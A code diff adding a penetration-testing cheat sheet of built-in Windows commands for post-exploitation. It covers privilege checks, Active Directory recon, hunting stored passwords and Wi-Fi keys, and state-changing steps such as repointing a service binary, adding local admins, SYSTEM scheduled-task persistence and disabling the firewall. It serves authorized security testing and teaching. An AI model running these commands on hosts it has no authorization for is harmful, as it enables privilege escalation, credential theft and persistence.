@@ -9591,6 +9591,524 @@ var TOOLKIT = [
     category: "Post Exploitation",
     tools: [
       {
+        "id": "windows-builtins",
+        "name": "Windows Built-in Commands",
+        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands",
+        "description": "The native cmd.exe toolset for post-exploitation on Windows — context, privileges, ACLs, users, AD recon, services, and networking without dropping a single binary.",
+        "brief": "Every Windows host already ships the tools you need to orient yourself after a foothold — no upload, no AV flag, no download. This page collects the built-in cmd.exe commands worth knowing: who you are and what you can do (whoami /priv, whoami /all), file permissions (icacls, takeown), running as another identity (runas, cmdkey), local and domain account enumeration (net user, net group), Active Directory recon (nltest, dsquery, setspn, klist, gpresult), service and task inspection (sc, schtasks, tasklist), and networking (ipconfig, netstat, arp, netsh).\n\nThese are \"living off the land\": they're signed, expected, and rarely alerted on by themselves, which makes them the quiet first move before reaching for noisier tooling. Everything here is read-first enumeration; the few state-changing commands (icacls /grant, sc config, netsh firewall) are called out as such. Values shown as <…> are placeholders.",
+        "quickReference": [
+          {
+            "label": "Who am I, what can I do (the first three commands)",
+            "cmd": "whoami /priv\nwhoami /groups\nwhoami /all"
+          },
+          {
+            "label": "View effective permissions on a file/dir",
+            "cmd": "icacls \"C:\\Path\\To\\target\""
+          },
+          {
+            "label": "Run a shell as another user (prompts for password)",
+            "cmd": "runas /user:DOMAIN\\user cmd"
+          },
+          {
+            "label": "Find the domain controllers",
+            "cmd": "nltest /dclist:<domain>"
+          },
+          {
+            "label": "Hunt stored passwords in files",
+            "cmd": "findstr /spin \"password\" *.txt *.ini *.config *.xml 2>nul"
+          }
+        ],
+        "sections": [
+          {
+            "title": "System & session context",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it tells you"
+            ],
+            "rows": [
+              [
+                "whoami",
+                "The current user as DOMAIN\\user"
+              ],
+              [
+                "whoami /user",
+                "Username plus the account SID"
+              ],
+              [
+                "whoami /fqdn",
+                "The fully-qualified distinguished name (domain-joined only)"
+              ],
+              [
+                "hostname",
+                "The machine name"
+              ],
+              [
+                "systeminfo",
+                "OS version, build, hotfixes, domain, boot time — pipe to findstr for patches"
+              ],
+              [
+                "ver",
+                "Just the Windows version string"
+              ],
+              [
+                "wmic qfe get HotFixID,InstalledOn",
+                "Installed patches — compare against known privesc CVEs"
+              ],
+              [
+                "set",
+                "All environment variables (PATH, USERDOMAIN, LOGONSERVER, temp paths, sometimes secrets)"
+              ],
+              [
+                "echo %USERDOMAIN% / %LOGONSERVER%",
+                "Current domain and the DC that authenticated this session"
+              ],
+              [
+                "query user  /  quser",
+                "Other interactive/RDP sessions on this host"
+              ],
+              [
+                "query session  /  qwinsta",
+                "Session IDs and states — useful before token theft or RDP hijack"
+              ]
+            ]
+          },
+          {
+            "title": "Privileges, groups & tokens",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "whoami /priv",
+                "List token privileges and whether each is Enabled — the single most important privesc check (look for SeImpersonate, SeBackup, SeRestore, SeDebug, SeManageVolume, SeLoadDriver, SeTakeOwnership)"
+              ],
+              [
+                "whoami /groups",
+                "Group memberships and the token's integrity level (Medium = unelevated, High = elevated admin)"
+              ],
+              [
+                "whoami /all",
+                "Everything: user SID, groups, and privileges in one dump"
+              ],
+              [
+                "net localgroup Administrators",
+                "Who is a local admin on this box"
+              ],
+              [
+                "net localgroup \"Remote Desktop Users\"",
+                "Who can RDP in"
+              ],
+              [
+                "klist",
+                "Kerberos tickets cached in the current session (TGT + service tickets)"
+              ]
+            ]
+          },
+          {
+            "title": "File permissions & ownership",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "icacls \"<path>\"",
+                "Show the DACL — who has what (F=full, M=modify, RX=read+exec, W=write). Read this first to spot writable service binaries/dirs"
+              ],
+              [
+                "icacls \"<path>\" /grant <user>:(F)",
+                "STATE-CHANGING — grant a user full control (needs write-DACL/ownership)"
+              ],
+              [
+                "icacls \"<path>\" /grant:r <user>:(M)",
+                "STATE-CHANGING — replace (/:r) this user's ACE with Modify"
+              ],
+              [
+                "icacls \"<path>\" /remove <user>",
+                "STATE-CHANGING — strip a user's ACEs"
+              ],
+              [
+                "icacls \"<dir>\" /grant <user>:(OI)(CI)F /T",
+                "STATE-CHANGING — grant full, inheritable to files (OI)/subdirs (CI), applied recursively (/T)"
+              ],
+              [
+                "icacls \"<path>\" /setowner <user>",
+                "STATE-CHANGING — set the owner (needs SeTakeOwnership or ownership)"
+              ],
+              [
+                "icacls \"<dir>\" /save acl.txt /T  …  /restore acl.txt",
+                "Back up and restore DACLs across a tree"
+              ],
+              [
+                "takeown /f \"<path>\" /r /d y",
+                "STATE-CHANGING — seize ownership of a file/tree so you can then re-ACL it"
+              ],
+              [
+                "attrib -h -r -s \"<path>\"",
+                "STATE-CHANGING — clear hidden/read-only/system attributes to reveal or edit a file"
+              ],
+              [
+                "dir /q /a \"<path>\"",
+                "List with owner (/q) including hidden/system (/a) entries"
+              ]
+            ]
+          },
+          {
+            "title": "Running as another identity & stored creds",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "runas /user:DOMAIN\\user cmd",
+                "Start a process as another user — prompts interactively for the password"
+              ],
+              [
+                "runas /user:DOMAIN\\user /savecred \"cmd\"",
+                "Reuse a previously saved password (also a privesc win if an admin's cred is already stored — check cmdkey /list)"
+              ],
+              [
+                "runas /netonly /user:DOMAIN\\user cmd",
+                "Use the creds only for NETWORK auth — not validated locally, so it works from a non-domain host with just domain creds (great for AD tooling)"
+              ],
+              [
+                "cmdkey /list",
+                "List saved credentials in the vault — /savecred runas or RDP creds you can reuse"
+              ],
+              [
+                "cmdkey /add:<host> /user:<u> /pass:<p>",
+                "STATE-CHANGING — store a credential for a target host"
+              ],
+              [
+                "cmdkey /delete:<host>",
+                "STATE-CHANGING — remove a stored credential"
+              ],
+              [
+                "net use \\\\<host>\\IPC$ /user:DOMAIN\\user <pass>",
+                "Authenticate an SMB session to a host (test creds, mount shares)"
+              ],
+              [
+                "net use \\\\<host>\\C$  /delete",
+                "Map / tear down an admin share"
+              ]
+            ]
+          },
+          {
+            "title": "Local users & groups",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "net user",
+                "List local user accounts"
+              ],
+              [
+                "net user <name>",
+                "Detail one account — last logon, group memberships, password flags"
+              ],
+              [
+                "net user <name> <pass> /add",
+                "STATE-CHANGING — create a local user"
+              ],
+              [
+                "net localgroup",
+                "List local groups"
+              ],
+              [
+                "net localgroup Administrators <user> /add",
+                "STATE-CHANGING — add a user to local admins"
+              ],
+              [
+                "net accounts",
+                "Local password/lockout policy (min length, lockout threshold)"
+              ]
+            ]
+          },
+          {
+            "title": "Domain & Active Directory recon",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "net user <name> /domain",
+                "Detail a domain account (groups, logon restrictions) — queries the DC"
+              ],
+              [
+                "net group /domain",
+                "List all domain groups"
+              ],
+              [
+                "net group \"Domain Admins\" /domain",
+                "Members of Domain Admins (swap for Enterprise Admins, etc.)"
+              ],
+              [
+                "net accounts /domain",
+                "Domain password & lockout policy — gate your spraying by this"
+              ],
+              [
+                "net view /domain",
+                "Browse domains visible on the network"
+              ],
+              [
+                "net view \\\\<host>",
+                "Enumerate shares on a host"
+              ],
+              [
+                "nltest /dclist:<domain>",
+                "List the domain controllers for a domain"
+              ],
+              [
+                "nltest /dsgetdc:<domain>",
+                "Locate and describe the nearest DC (site, flags, address)"
+              ],
+              [
+                "nltest /domain_trusts",
+                "Enumerate trusted domains — map the forest/trust landscape"
+              ],
+              [
+                "nltest /trusted_domains",
+                "Trust relationships of the current domain"
+              ],
+              [
+                "dsquery user -limit 0",
+                "List all domain users (present when the AD DS/RSAT tools are installed, e.g. on a DC/admin host)"
+              ],
+              [
+                "dsquery group / dsquery computer",
+                "Enumerate domain groups / computers"
+              ],
+              [
+                "setspn -L <account>",
+                "Service Principal Names for an account"
+              ],
+              [
+                "setspn -T <domain> -Q */*",
+                "Find every SPN in the domain — the target list for Kerberoasting"
+              ],
+              [
+                "gpresult /r",
+                "Applied Group Policy for the current user/computer (summary)"
+              ],
+              [
+                "gpresult /h gp.html",
+                "Full applied-GPO report as HTML — read for mapped drives, scripts, restrictions"
+              ],
+              [
+                "klist tgt / klist",
+                "Inspect cached Kerberos tickets (encryption type, expiry)"
+              ]
+            ]
+          },
+          {
+            "title": "Services, processes & scheduled tasks",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "sc query state= all",
+                "List all services and their state (note the space after state=)"
+              ],
+              [
+                "sc qc <service>",
+                "Show a service's config — binary path (BINARY_PATH_NAME) and the account it runs as"
+              ],
+              [
+                "sc config <service> binPath= \"C:\\evil.exe\"",
+                "STATE-CHANGING — repoint a weak-ACL service's binary (classic privesc; space after binPath=)"
+              ],
+              [
+                "sc stop <service>  /  sc start <service>",
+                "STATE-CHANGING — restart a service to trigger your new binPath"
+              ],
+              [
+                "tasklist /v",
+                "Running processes with the owning user — spot SYSTEM/admin processes"
+              ],
+              [
+                "tasklist /svc",
+                "Map processes to the services hosted in them"
+              ],
+              [
+                "taskkill /PID <pid> /F",
+                "STATE-CHANGING — force-kill a process"
+              ],
+              [
+                "schtasks /query /fo LIST /v",
+                "All scheduled tasks, verbose — look for SYSTEM tasks running a writable script/binary"
+              ],
+              [
+                "schtasks /create /tn <n> /tr \"<cmd>\" /sc onlogon /ru SYSTEM",
+                "STATE-CHANGING — persistence via a task (requires rights)"
+              ],
+              [
+                "wmic service get Name,PathName,StartName",
+                "Service binary paths + run-as account in one table (unquoted-path / weak-ACL hunting)"
+              ],
+              [
+                "wmic process list brief",
+                "Processes with PID/parent — quick triage"
+              ]
+            ]
+          },
+          {
+            "title": "Networking",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "ipconfig /all",
+                "Interfaces, IPs, DNS servers (often the DC), domain suffix, MAC"
+              ],
+              [
+                "arp -a",
+                "ARP cache — hosts this box has recently talked to on-LAN"
+              ],
+              [
+                "route print",
+                "Routing table — reveals other reachable subnets to pivot toward"
+              ],
+              [
+                "netstat -ano",
+                "All connections/listeners with owning PID — map internal services and C2"
+              ],
+              [
+                "netstat -anob",
+                "Same, plus the owning program name (needs admin)"
+              ],
+              [
+                "nbtstat -A <ip>",
+                "NetBIOS name table for a remote host (names, MAC)"
+              ],
+              [
+                "getmac",
+                "MAC addresses of local adapters"
+              ],
+              [
+                "netsh advfirewall show allprofiles",
+                "Firewall state per profile"
+              ],
+              [
+                "netsh advfirewall set allprofiles state off",
+                "STATE-CHANGING — disable the Windows firewall (loud; admin)"
+              ],
+              [
+                "netsh wlan show profiles",
+                "Saved Wi-Fi profiles"
+              ],
+              [
+                "netsh wlan show profile name=\"<ssid>\" key=clear",
+                "Reveal a saved Wi-Fi key in cleartext"
+              ]
+            ]
+          },
+          {
+            "title": "Hunting stored secrets",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Search files for passwords",
+                "cmd": "findstr /spin \"password\" *.txt *.ini *.config *.xml 2>nul\n# /s recurse, /p skip binary, /i case-insensitive, /n line numbers"
+              },
+              {
+                "label": "Search the registry for passwords",
+                "cmd": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s"
+              },
+              {
+                "label": "Classic credential locations",
+                "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"   # autologon DefaultPassword\ncmdkey /list                                                        # saved creds\ndir /s /b %USERPROFILE%\\*unattend* %USERPROFILE%\\*.kdbx 2>nul       # unattend.xml / KeePass"
+              },
+              {
+                "label": "Group Policy Preferences cpassword (reversible)",
+                "cmd": "findstr /S /I cpassword \\\\<domain>\\sysvol\\<domain>\\policies\\*.xml"
+              }
+            ]
+          },
+          {
+            "title": "Typical first-5-minutes workflow",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Orient (who/where/what can I do)",
+                "cmd": "whoami /all\nhostname & ver\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Domain\"\nnet localgroup Administrators"
+              },
+              {
+                "label": "Look for a privesc primitive",
+                "cmd": "whoami /priv\nwmic service get Name,PathName,StartName | findstr /I /V \"C:\\Windows\"\nschtasks /query /fo LIST /v | findstr /I \"TaskName Run As User SYSTEM\""
+              },
+              {
+                "label": "Map the network & domain",
+                "cmd": "ipconfig /all\nroute print\nnltest /dclist:<domain>\nnltest /domain_trusts"
+              },
+              {
+                "label": "Sweep for easy creds",
+                "cmd": "cmdkey /list\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\nfindstr /spin \"password\" *.txt *.ini *.config 2>nul"
+              }
+            ]
+          },
+          {
+            "title": "Notes & OPSEC",
+            "type": "notes",
+            "items": [
+              "These are the quiet first move: signed, present on every host, and rarely alerted on individually — but a burst of them in seconds is itself a behavioural signal, so pace your enumeration and don't shotgun every command at once.",
+              "whoami /priv is the highest-value single command: an Enabled SeImpersonate/SeAssignPrimaryToken, SeBackup/SeRestore, SeDebug, SeManageVolume or SeLoadDriver is a direct path to SYSTEM — see the token-abuse theory page.",
+              "runas /netonly is the trick for using domain creds from an unjoined host or a different user context: it never validates the password locally, so a wrong password still spawns a shell that fails only when it hits the network.",
+              "icacls output is the map for the 'writable + privileged' privesc pattern — a service binary, scheduled-task script, or DLL directory writable by your user is the overlap you're looking for.",
+              "sc config, icacls /grant, schtasks /create, net user /add and netsh firewall changes modify the host — they are noisy, often logged, and should be deliberate, cleaned up, and within scope.",
+              "wmic is deprecated and absent on the newest builds; prefer sc, PowerShell Get-CimInstance, or the Get-* cmdlets where wmic is missing.",
+              "Confirm written authorization before enumerating or changing anything on a host you don't own."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Microsoft — Windows Commands reference",
+                "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands"
+              },
+              {
+                "label": "Microsoft — icacls",
+                "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
+              },
+              {
+                "label": "Theory — Windows Local Privilege Escalation",
+                "url": "theory/2026-10-15-windows-local-privilege-escalation.html"
+              },
+              {
+                "label": "Theory — Windows Token Abuse & Potato Attacks",
+                "url": "theory/2026-10-09-windows-token-potato.html"
+              },
+              {
+                "label": "Theory — Windows Access Tokens & UAC",
+                "url": "theory/2026-08-18-windows-tokens-uac.html"
+              },
+              {
+                "label": "Toolkit — Mimikatz (credential extraction)",
+                "url": "tool-detail.html?tool=mimikatz"
+              }
+            ]
+          }
+        ]
+      },
+      {
         id: "mimikatz",
         name: "Mimikatz",
         url: "https://github.com/gentilkiwi/mimikatz",
